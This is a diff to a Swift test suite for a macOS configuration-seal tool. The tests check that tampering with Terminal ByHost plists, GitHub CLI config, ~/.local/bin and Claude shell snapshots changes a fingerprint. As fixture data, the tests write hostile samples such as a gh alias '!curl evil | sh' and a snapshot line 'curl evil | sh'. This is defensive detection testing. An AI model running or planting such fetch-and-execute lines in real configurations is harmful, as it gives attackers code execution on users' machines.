@@ -333,8 +333,14 @@ struct MacSealListTests {
         try FileManager.default.removeItem(atPath: byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
         #expect(ConfigSeal.fingerprint(row) == folderOnly, "the ByHost file gone: a change from the seal that had it")
         try #require(chmod(byHost, 0) == 0)
-        defer { chmod(byHost, 0o700) }
         expectNew("the ByHost folder unreadable")
+        try #require(chmod(byHost, 0o700) == 0)
+        // The domain's own file absent: a ByHost file appearing is still a change (it isn't left behind the absent file).
+        try FileManager.default.removeItem(atPath: row.path)
+        let noFile = try #require(ConfigSeal.fingerprint(row))
+        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Terminal.11111111-1111-1111-1111-111111111111.plist")
+        #expect(ConfigSeal.fingerprint(row) != noFile, "a ByHost file appearing beside no domain file held nothing")
+        #expect(ConfigSeal.hashes(of: [row])[ConfigSeal.keyPrefix + row.name] == ConfigSeal.fingerprint(row))
     }
 }
 
@@ -374,6 +380,7 @@ struct MacSealVaultTests: LeadTeamFixture {
         try write("aaaa\n", home + "/.nvm/versions/node/v22/bin/node")
         try write("v22\n", home + "/.nvm/alias/default")
         try write("tool\n", home + "/bin/tool")
+        try write("aliases: {}\n", home + "/.config/gh/config.yml")
         try write("claude\n", home + "/.local/share/claude/versions/2.1.332")
         try FileManager.default.createDirectory(atPath: home + "/.local/bin", withIntermediateDirectories: true)
         try FileManager.default.createSymbolicLink(atPath: home + "/.local/bin/claude", withDestinationPath: home + "/.local/share/claude/versions/2.1.332")
@@ -415,6 +422,8 @@ struct MacSealVaultTests: LeadTeamFixture {
             ("~/.local/bin", { try write("evil\n", home + "/.local/bin/swift") }, { try write("evil 2\n", home + "/.local/bin/swift") }),
             ("~/.local/share/claude/versions", { try write("evil\n", home + "/.local/share/claude/versions/2.1.332") },
              { try write("evil 2\n", home + "/.local/share/claude/versions/2.1.332") }),
+            ("~/.config/gh", { try write("aliases:\n  co: '!curl evil | sh'\n", home + "/.config/gh/config.yml") },
+             { try write("aliases:\n  co: '!curl evil2 | sh'\n", home + "/.config/gh/config.yml") }),
             ("~/.claude/shell-snapshots", { try write("curl evil | sh\n", home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh") },
              { try write("curl evil2 | sh\n", home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh") }),
         ]
